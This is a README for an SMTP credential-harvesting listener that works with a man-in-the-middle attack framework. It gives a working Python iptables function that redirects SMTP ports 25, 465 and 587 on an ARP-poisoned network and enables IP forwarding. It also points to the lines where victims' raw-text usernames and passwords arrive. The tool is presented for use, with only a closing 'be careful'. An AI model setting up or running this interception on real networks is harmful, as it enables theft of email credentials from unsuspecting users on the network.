# jjsmtp-listener

_mitm-smtp-listener_ acts as a SMTP-server with a self-signed certificate, however behaves differently at certain points of the ESMTP protocol in order to eavesdrop on the username and password.  
It was originally developed for man-in-the-middle attacks on networks and works well with [Subterfuge](http://code.google.com/p/subterfuge/), an automated man-in-the-middle attack framework.

---

## Setup

The following steps are explained for Subterfuge, however should work in any other man-in-the-middle attack scenario.
Assuming we have an ARP poisoned network in which all traffic passes our machine, we have to redirect all TCP traffic bound for SMTP ports (25, 465, 587) to our twisted reactor.
For Subterfuge, do this using `iptables` in the file `attackctrl.py`. The function `iptablesconfig` should look like this:


```python
def iptablesconfig():
    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('iptables -t mangle -F')
    os.system('iptables -t mangle -X')
    os.system('iptables -P INPUT ACCEPT')
    os.system('iptables -P FORWARD ACCEPT')
    os.system('iptables -P OUTPUT ACCEPT')
    time.sleep(1)
    os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 	10000')

   	# THIS IS WHERE THE SMTP PORTS ARE ROUTED TO OUR REACTOR 
    print "SMTP Prerouting configuration"
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 25 -j REDIRECT --to-port    9998')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-port    9997')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-port    9996')
   
    time.sleep(1)
    print "Iptables Prerouting Configured\n"
    
    print 'Configuring System...'
    os.system('sysctl -w net.ipv4.ip_forward=1')
    print "IP Forwarding Enabled."
```

Next, when everything has been set up, import jjmail  
`from jjmail import jjsmtp`  
and tell it to set up everything:  
`jjsmtp.configureSMTPTraffic()`  

In Subterfuge, this is done in `sslstrip.py`, right after `reactor.listenTCP(int(listenPort), strippingFactory)`.


## Relaying mails

There is no implementation of listening to which SMTP-server any mail is actually bound for. Thus all messages must be sent via a relay server of your choice. For this, enter your credentials in lines __33 to 36__ in `jjsmtp.py`.

## Getting the credentials

Raw-Text username rolls in on line 161, raw-text password rolls in on line 166. Do whatever you want, but please be careful!
